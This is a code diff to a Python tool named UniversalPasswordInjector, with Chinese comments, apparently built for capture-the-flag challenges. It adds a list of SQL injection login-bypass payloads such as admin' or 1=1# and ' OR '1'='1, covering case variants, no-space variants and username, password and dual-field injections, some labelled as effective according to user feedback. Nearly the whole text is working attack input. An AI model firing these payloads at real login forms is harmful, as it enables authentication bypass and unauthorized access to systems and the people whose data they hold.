@@ -91,7 +91,7 @@ class UniversalPasswordInjector:
     def get_login_form_payloads(self) -> List[Dict[str, str]]:
         """获取登录表单专用payload"""
         return [
-            # 登录绕过payload
+            # 登录绕过payload - 用户名字段注入
             {"username": "admin'--", "password": ""},
             {"username": "admin'#", "password": ""},
             {"username": "admin'/*", "password": ""},
@@ -100,14 +100,34 @@ class UniversalPasswordInjector:
             {"username": "admin' OR '1'='1", "password": "password"},
             {"username": "admin' OR '1'='1'--", "password": "password"},
             
+            # 新增：用户反馈的有效payload
+            {"username": "admin' or 1=1#", "password": ""},
+            {"username": "admin' or 1=1--", "password": ""},
+            {"username": "admin' or '1'='1'#", "password": ""},
+            {"username": "admin' or '1'='1'--", "password": ""},
+            {"username": "admin' or 'a'='a'#", "password": ""},
+            
+            # 大小写变体
+            {"username": "admin' OR 1=1#", "password": ""},
+            {"username": "ADMIN' OR 1=1#", "password": ""},
+            {"username": "admin' Or 1=1#", "password": ""},
+            
+            # 无空格变体
+            {"username": "admin'or1=1#", "password": ""},
+            {"username": "admin'OR'1'='1'#", "password": ""},
+            
             # 密码字段注入
             {"username": "admin", "password": "' OR '1'='1"},
             {"username": "admin", "password": "' OR 1=1--"},
             {"username": "admin", "password": "' OR 'a'='a"},
+            {"username": "admin", "password": "' OR 1=1#"},
+            {"username": "admin", "password": "' OR '1'='1'#"},
             
             # 双字段注入
             {"username": "' OR '1'='1", "password": "' OR '1'='1"},
             {"username": "' OR 1=1--", "password": "' OR 1=1--"},
+            {"username": "' OR 1=1#", "password": "' OR 1=1#"},
+            {"username": "admin' or 1=1#", "password": "anything"},
         ]
     
     def detect_flag(self, text: str) -> Optional[str]:
